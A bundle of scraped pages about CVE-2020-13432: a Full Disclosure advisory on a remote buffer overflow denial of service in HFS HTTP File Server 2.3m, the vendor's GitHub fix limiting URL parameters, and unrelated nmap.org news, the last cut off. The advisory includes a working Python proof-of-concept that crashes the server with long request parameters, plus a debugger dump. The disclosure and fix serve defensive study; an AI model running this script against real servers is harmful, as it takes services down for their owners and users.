=== Content from packetstormsecurity.com_a0fc1f59_20250119_123859.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from seclists.org_685ccb55_20250119_123900.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# CVE-2020-13432 - HFS HTTP File Server / Remote Buffer Overflow DoS

---

*From*: hyp3rlinx <apparitionsec () gmail com>

*Date*: Mon, 8 Jun 2020 00:47:14 -0400

---

```
[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source:
<http://hyp3rlinx.altervista.org/advisories/HFS-HTTP-FILE-SERVER-v2.3-REMOTE-BUFFER-OVERFLOW-DoS.txt>
[+] twitter.com/hyp3rlinx
[+] ISR: ApparitionSec

[Vendor]
www.rejetto.com

[Product]
HFS Http File Server v2.3m Build 300

[Vulnerability Type]
Remote Buffer Overflow (DoS)

[CVE Reference]
CVE-2020-13432

[Security Issue]
rejetto HFS (aka HTTP File Server) v2.3m Build #300, when virtual
files or folders are used, allows remote attackers to trigger an
invalid-pointer write access violation via concurrent HTTP requests
with a long URI or long HTTP headers like Cookie, User-Agent etc.

Remote unauthenticated attackers can send concurrent HTTP requests
using an incrementing or specific payload range of junk characters for
values in the URL parameters or HTTP headers sent to the server. This
results in hfs.exe server crash from an invalid pointer write access
violation.

Requirements:
hfs.exe must have at least one saved virtual file or folder present.
Test using a remote IP and NOT from the same machine (localhost).

Dump...

(e4c.3a8): Access violation - code c0000005 (first/second chance not
available)
For analysis of this file, run !analyze -v
WARNING: Stack overflow detected. The unwound frames are extracted from
outside normal stack bounds.
eax=000a1390 ebx=000a138c ecx=006eb188 edx=001b0000 esi=00000000
edi=00000002
eip=777ef8b4 esp=000a0e0c ebp=000a12cc iopl=0         nv up ei pl nz na pe
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00210206
ntdll!RtlpResolveAssemblyStorageMapEntry+0x18:
777ef8b4 53              push    ebx
0:000> !load winext/msec
0:000> !exploitable
WARNING: Stack overflow detected. The unwound frames are extracted from
outside normal stack bounds.
*** WARNING: Unable to verify checksum for hfs.exe
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at
ntdll!RtlpResolveAssemblyStorageMapEntry+0x0000000000000018
(Hash=0x7a29717c.0x325e6a71)

PROCESS_NAME:  hfs.exe

FOLLOWUP_IP:
hfs+8fad7
0048fad7 8945f0          mov     dword ptr [ebp-10h],eax

WRITE_ADDRESS:  000a0e08

[References]
<https://github.com/rejetto/hfs2/releases/tag/v2.4-rc01>

[Exploit/POC]
from socket import *
import time,sys

#HFS HTTP File Server v2.3m build 300.
#Vendor: www.rejetto.com
#Remote Remote Buffer Overflow DoS
#Note: hfs.exe must have at least one saved virtual file or folder on the
target
#test using a remote IP and not from the same machine.
#Discovery: hyp3rlinx
#hyp3rlinx.altervista.org
#ISR: ApparitionSec
#=========================================================================
res=""
once=0
cnt=0
max_requests=1666

def hfs_dos():

    global ip,port,length,res,once,cnt,max_requests

    cnt+=1

    length += 1
    payload = "A"*length

    try:
        s=socket(AF_INET, SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,port))
        ##bof ="HEAD / HTTP/1.1\r\nHost: "+ip+"Cookie: "+payload+"\r\n\r\n"
        bof ="HEAD /?mode="+payload+" HTTP/1.1\r\nHost: "+ip+"\r\n\r\n"
        s.send(bof.encode("utf-8"))
        if once==0:
            once+=1
            res = s.recv(128)
            if res != "":
                print("Targets up please wait...")
                if "HFS 2.3m" not in str(res):
                    print("[!] Non vulnerable HFS version, exiting :(")
                    exit()
    except Exception as e:
        if e != None:
            if str(e).find("timed out")!=-1:
                if res=="":
                    print("[!] Target is not up or behind a firewall? :(")
                    exit()
                else:
                    print("[!] Done!")
                    exit()
    s.close()

    if cnt == max_requests:
        return False
    return True

def msg():
    print("HFS HTTP File Server v2.3m build 300.")
    print("Unauthenticated Remote Buffer Overflow (DoS - PoC)")
    print("Virtual HFS saved file or folder required.")
    print("Run from a different machine (IP) than the target.")
    print("By Hyp3rlinx - ApparitionSec\n")

if __name__=="__main__":

    length=3

    if len(sys.argv) != 3:
        msg()
        print("Usage: <hfs.exe Server>, <Port (usually 8080)>")
        exit()

    ip = sys.argv[1]
    port = int(sys.argv[2])

    msg()

    while True:
        if not hfs_dos():
            print("[!] Failed, non vuln version or no virtual files exist
:(")
            break

[POC Video URL]
<https://www.youtube.com/watch?v=qQ-EawfXuWY>

[Network Access]
Remote

[Severity]
High

[Disclosure Timeline]
Vendor Notification: May 18, 2020
Vendor reply: May 18, 2020
Vendor confirm vulnerability: May 19, 2020
Vendor creates fix: May 20, 2020
Vendor released new version 2.4 : June 7, 2020
June 8, 2020 : Public Disclosure

[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the
information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author
prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](17)

### Current thread:

* **CVE-2020-13432 - HFS HTTP File Server / Remote Buffer Overflow DoS** *hyp3rlinx (Jun 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_880ad4b5_20250119_123904.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frejetto%2Fhfs2%2Fcommit%2Fb8ebfc4e22948e1a61506cd66e397b61ea5ea5de)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frejetto%2Fhfs2%2Fcommit%2Fb8ebfc4e22948e1a61506cd66e397b61ea5ea5de)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=rejetto%2Fhfs2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rejetto](/rejetto)
/
**[hfs2](/rejetto/hfs2)**
Public

* [Notifications](/login?return_to=%2Frejetto%2Fhfs2) You must be signed in to change notification settings
* [Fork
  139](/login?return_to=%2Frejetto%2Fhfs2)
* [Star
   625](/login?return_to=%2Frejetto%2Fhfs2)

* [Code](/rejetto/hfs2)
* [Issues
  23](/rejetto/hfs2/issues)
* [Pull requests
  2](/rejetto/hfs2/pulls)
* [Actions](/rejetto/hfs2/actions)
* [Projects
  0](/rejetto/hfs2/projects)
* [Security](/rejetto/hfs2/security)
* [Insights](/rejetto/hfs2/pulse)

Additional navigation options

* [Code](/rejetto/hfs2)
* [Issues](/rejetto/hfs2/issues)
* [Pull requests](/rejetto/hfs2/pulls)
* [Actions](/rejetto/hfs2/actions)
* [Projects](/rejetto/hfs2/projects)
* [Security](/rejetto/hfs2/security)
* [Insights](/rejetto/hfs2/pulse)

## Commit

[Permalink](/rejetto/hfs2/commit/b8ebfc4e22948e1a61506cd66e397b61ea5ea5de)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

limit URL parameters to 1000 characters

[Browse files](/rejetto/hfs2/tree/b8ebfc4e22948e1a61506cd66e397b61ea5ea5de)
Browse the repository at this point in the history

* Loading branch information

[![@rejetto](https://avatars.githubusercontent.com/u/1367199?s=40&v=4)](/rejetto)

[rejetto](/rejetto/hfs2/commits?author=rejetto "View all commits by rejetto")
committed
May 22, 2020

1 parent
[bb1e2fa](/rejetto/hfs2/commit/bb1e2fa78245f47d10c7a19810f0894b26373e1e)

commit b8ebfc4

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**47 additions**
and
**32 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* main.dfm
  [main.dfm](#diff-a39758f0fc4e275536febe127c67b765de99a3d990ab4233426d4e686599a7e8)
* main.pas
  [main.pas](#diff-449243edd8ba91d6d43d39c7bb109819a01e7c4e75770a16698291e7a6eb2363)
* scriptLib.pas
  [scriptLib.pas](#diff-af98362b85c574d4b328dfb533a70e7fc17878d1df07a6c374e0a775fab49a05)

## There are no files selected for viewing

65 changes: 38 additions & 27 deletions

65
[main.dfm](#diff-a39758f0fc4e275536febe127c67b765de99a3d990ab4233426d4e686599a7e8 "main.dfm")

Show comments

[View file](/rejetto/hfs2/blob/b8ebfc4e22948e1a61506cd66e397b61ea5ea5de/main.dfm)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,8 +2,8 @@ object mainFrm: TmainFrm |
|  |  | Left = 293 |
|  |  | Top = 219 |
|  |  | Caption = 'HFS ~ HTTP File Server' |
|  |  | ClientHeight = 391 |
|  |  | ClientWidth = 913 |
|  |  | ClientHeight = 483 |
|  |  | ClientWidth = 879 |
|  |  | Color = clBtnFace |
|  |  | Constraints.MinHeight = 260 |
|  |  | Constraints.MinWidth = 390 |
| Expand All | | @@ -27,7 +27,7 @@ object mainFrm: TmainFrm |
|  |  | object graphSplitter: TSplitter |
|  |  | Left = 0 |
|  |  | Top = 78 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 5 |
|  |  | Cursor = crVSplit |
|  |  | Align = alTop |
| Expand All | | @@ -42,7 +42,7 @@ object mainFrm: TmainFrm |
|  |  | object graphBox: TPaintBox |
|  |  | Left = 0 |
|  |  | Top = 48 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 30 |
|  |  | Hint = 'Pink = Out'#13#10'Yellow = In' |
|  |  | Align = alTop |
| Expand All | | @@ -62,7 +62,7 @@ object mainFrm: TmainFrm |
|  |  | object topToolbar: TToolBar |
|  |  | Left = 0 |
|  |  | Top = 0 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 24 |
|  |  | AutoSize = True |
|  |  | ButtonWidth = 150 |
| Expand All | | @@ -78,6 +78,7 @@ object mainFrm: TmainFrm |
|  |  | ParentFont = False |
|  |  | ShowCaptions = True |
|  |  | TabOrder = 1 |
|  |  | ExplicitWidth = 976 |
|  |  | object menuBtn: TToolButton |
|  |  | Left = 0 |
|  |  | Top = 0 |
| Expand Down  Expand Up | | @@ -173,7 +174,7 @@ object mainFrm: TmainFrm |
|  |  | object urlToolbar: TToolBar |
|  |  | Left = 0 |
|  |  | Top = 24 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 24 |
|  |  | AutoSize = True |
|  |  | ButtonWidth = 122 |
| Expand All | | @@ -189,6 +190,7 @@ object mainFrm: TmainFrm |
|  |  | ShowCaptions = True |
|  |  | TabOrder = 2 |
|  |  | Wrapable = False |
|  |  | ExplicitWidth = 976 |
|  |  | object browseBtn: TToolButton |
|  |  | Left = 0 |
|  |  | Top = 0 |
| Expand Down  Expand Up | | @@ -217,8 +219,8 @@ object mainFrm: TmainFrm |
|  |  | object centralPnl: TPanel |
|  |  | Left = 0 |
|  |  | Top = 83 |
|  |  | Width = 913 |
|  |  | Height = 308 |
|  |  | Width = 879 |
|  |  | Height = 400 |
|  |  | Align = alClient |
|  |  | BevelOuter = bvNone |
|  |  | Font.Charset = DEFAULT\_CHARSET |
| Expand All | | @@ -228,10 +230,11 @@ object mainFrm: TmainFrm |
|  |  | Font.Style = [] |
|  |  | ParentFont = False |
|  |  | TabOrder = 0 |
|  |  | ExplicitWidth = 976 |
|  |  | object splitV: TSplitter |
|  |  | Left = 313 |
|  |  | Top = 0 |
|  |  | Height = 197 |
|  |  | Height = 289 |
|  |  | Beveled = True |
|  |  | Constraints.MaxWidth = 3 |
|  |  | Constraints.MinWidth = 3 |
| Expand All | | @@ -241,8 +244,8 @@ object mainFrm: TmainFrm |
|  |  | end |
|  |  | object splitH: TSplitter |
|  |  | Left = 0 |
|  |  | Top = 197 |
|  |  | Width = 913 |
|  |  | Top = 289 |
|  |  | Width = 879 |
|  |  | Height = 5 |
|  |  | Cursor = crVSplit |
|  |  | Align = alBottom |
| Expand All | | @@ -256,16 +259,17 @@ object mainFrm: TmainFrm |
|  |  | object logPnl: TPanel |
|  |  | Left = 316 |
|  |  | Top = 0 |
|  |  | Width = 597 |
|  |  | Height = 197 |
|  |  | Width = 563 |
|  |  | Height = 289 |
|  |  | Align = alClient |
|  |  | BevelOuter = bvNone |
|  |  | TabOrder = 1 |
|  |  | ExplicitWidth = 660 |
|  |  | object logBox: TRichEdit |
|  |  | Left = 0 |
|  |  | Top = 23 |
|  |  | Width = 597 |
|  |  | Height = 174 |
|  |  | Width = 563 |
|  |  | Height = 266 |
|  |  | Align = alClient |
|  |  | Font.Charset = ANSI\_CHARSET |
|  |  | Font.Color = clWindowText |
| Expand All | | @@ -282,34 +286,38 @@ object mainFrm: TmainFrm |
|  |  | Zoom = 100 |
|  |  | OnChange = logBoxChange |
|  |  | OnMouseDown = logBoxMouseDown |
|  |  | ExplicitWidth = 660 |
|  |  | end |
|  |  | object logTitle: TPanel |
|  |  | Left = 0 |
|  |  | Top = 0 |
|  |  | Width = 597 |
|  |  | Width = 563 |
|  |  | Height = 23 |
|  |  | Align = alTop |
|  |  | BevelOuter = bvNone |
|  |  | TabOrder = 1 |
|  |  | ExplicitWidth = 660 |
|  |  | object titlePnl: TPanel |
|  |  | Left = 0 |
|  |  | Top = 0 |
|  |  | Width = 337 |
|  |  | Width = 303 |
|  |  | Height = 23 |
|  |  | Align = alClient |
|  |  | BevelOuter = bvNone |
|  |  | Caption = 'Log' |
|  |  | TabOrder = 0 |
|  |  | ExplicitWidth = 400 |
|  |  | end |
|  |  | object logToolbar: TPanel |
|  |  | Left = 337 |
|  |  | Left = 303 |
|  |  | Top = 0 |
|  |  | Width = 260 |
|  |  | Height = 23 |
|  |  | Align = alRight |
|  |  | AutoSize = True |
|  |  | BevelOuter = bvNone |
|  |  | TabOrder = 1 |
|  |  | ExplicitLeft = 400 |
|  |  | object collapsedPnl: TPanel |
|  |  | Left = 0 |
|  |  | Top = 0 |
| Expand Down  Expand Up | | @@ -557,7 +565,7 @@ object mainFrm: TmainFrm |
|  |  | Left = 0 |
|  |  | Top = 0 |
|  |  | Width = 313 |
|  |  | Height = 197 |
|  |  | Height = 289 |
|  |  | Align = alLeft |
|  |  | BevelOuter = bvNone |
|  |  | Caption = 'filesPnl' |
| Expand All | | @@ -566,7 +574,7 @@ object mainFrm: TmainFrm |
|  |  | Left = 0 |
|  |  | Top = 23 |
|  |  | Width = 313 |
|  |  | Height = 174 |
|  |  | Height = 266 |
|  |  | Align = alClient |
|  |  | BevelInner = bvLowered |
|  |  | BevelOuter = bvSpace |
| Expand Down  Expand Up | | @@ -616,28 +624,30 @@ object mainFrm: TmainFrm |
|  |  | end |
|  |  | object connPnl: TPanel |
|  |  | Left = 0 |
|  |  | Top = 202 |
|  |  | Width = 913 |
|  |  | Top = 294 |
|  |  | Width = 879 |
|  |  | Height = 106 |
|  |  | Align = alBottom |
|  |  | BevelOuter = bvNone |
|  |  | TabOrder = 2 |
|  |  | ExplicitWidth = 976 |
|  |  | object sbar: TStatusBar |
|  |  | Left = 0 |
|  |  | Top = 87 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 19 |
|  |  | Panels = < |
|  |  | item |
|  |  | Width = 2000 |
|  |  | end> |
|  |  | OnDblClick = sbarDblClick |
|  |  | OnMouseDown = sbarMouseDown |
|  |  | ExplicitWidth = 976 |
|  |  | end |
|  |  | object connBox: TListView |
|  |  | Left = 0 |
|  |  | Top = 0 |
|  |  | Width = 913 |
|  |  | Width = 879 |
|  |  | Height = 87 |
|  |  | Align = alClient |
|  |  | Columns = < |
| Expand All | | @@ -660,6 +670,7 @@ object mainFrm: TmainFrm |
|  |  | item |
|  |  | Alignment = taCenter |
|  |  | Caption = 'Speed' |
|  |  | Width = 100 |
|  |  | end |
|  |  | item |
|  |  | Alignment = taCenter |
| Expand All | | @@ -684,6 +695,7 @@ object mainFrm: TmainFrm |
|  |  | ViewStyle = vsReport |
|  |  | OnAdvancedCustomDrawSubItem = connBoxAdvancedCustomDrawSubItem |
|  |  | OnData = connBoxData |
|  |  | ExplicitWidth = 976 |
|  |  | end |
|  |  | end |
|  |  | end |
| Expand Down  Expand Up | | @@ -3153,8 +3165,8 @@ object mainFrm: TmainFrm |
|  |  | object connmenu: TPopupMenu |
|  |  | Images = images |
|  |  | OnPopup = connmenuPopup |
|  |  | Left = 248 |
|  |  | Top = 320 |
|  |  | Left = 264 |
|  |  | Top = 408 |
|  |  | object Kickconnection1: TMenuItem |
|  |  | Caption = 'Kick connection' |
|  |  | OnClick = Kickconnection1Click |
| Expand Down  Expand Up | | @@ -3272,7 +3284,6 @@ object mainFrm: TmainFrm |
|  |  | object logRequestsChk: TMenuItem |
|  |  | AutoCheck = True |
|  |  | Caption = 'Requests' |
|  |  | Checked = True |
|  |  | end |
|  |  | object DumprequestsChk: TMenuItem |
|  |  | AutoCheck = True |
| Expand Down | |  |

9 changes: 8 additions & 1 deletion

9
[main.pas](#diff-449243edd8ba91d6d43d39c7bb109819a01e7c4e75770a16698291e7a6eb2363 "main.pas")

Show comments

[View file](/rejetto/hfs2/blob/b8ebfc4e22948e1a61506cd66e397b61ea5ea5de/main.pas)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -4781,6 +4781,8 @@ procedure Tmainfrm.httpEvent(event:ThttpEvent; conn:ThttpConn); |
|  |  | end; // limitsExceededOnDownload |
|  |  |  |
|  |  | procedure extractParams(); |
|  |  | const |
|  |  | MAX = 1000; |
|  |  | var |
|  |  | s: string; |
|  |  | i: integer; |
| Expand All | | @@ -4790,7 +4792,12 @@ procedure Tmainfrm.httpEvent(event:ThttpEvent; conn:ThttpConn); |
|  |  | s:=replaceStr(s,'+',' '); |
|  |  | data.urlvars.text:=s; |
|  |  | for i:=0 to data.urlvars.count-1 do |
|  |  | data.urlvars[i]:=decodeURL(ansistring(data.urlvars[i])); |
|  |  | begin |
|  |  | s:=decodeURL(ansistring(data.urlvars[i])); |
|  |  | if length(s) > MAX then |
|  |  | setLength(s, MAX); |
|  |  | data.urlvars[i]:=s; |
|  |  | end; |
|  |  | end; // extractParams |
|  |  |  |
|  |  | procedure closeUploadingFile(); |
| Expand Down | |  |

5 changes: 1 addition & 4 deletions

5
[scriptLib.pas](#diff-af98362b85c574d4b328dfb533a70e7fc17878d1df07a6c374e0a775fab49a05 "scriptLib.pas")

Show comments

[View file](/rejetto/hfs2/blob/b8ebfc4e22948e1a61506cd66e397b61ea5ea5de/scriptLib.pas)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1783,10 +1783,7 @@ function cbMacros(fullMacro:string; pars:Tstrings; cbData:pointer):string; |
|  |  | end; |
|  |  |  |
|  |  | if not mainfrm.enableMacrosChk.checked then |
|  |  | begin |
|  |  | result:=fullMacro; |
|  |  | exit; |
|  |  | end; |
|  |  | exit(fullMacro); |
|  |  |  |
|  |  | if pars.count = 0 then exit; |
|  |  | // extract first parameter as 'name' |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b8ebfc4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frejetto%2Fhfs2%2Fcommit%2Fb8ebfc4e22948e1a61506cd66e397b61ea5ea5de) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from nmap.org_9ba698e9_20250119_141303.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap 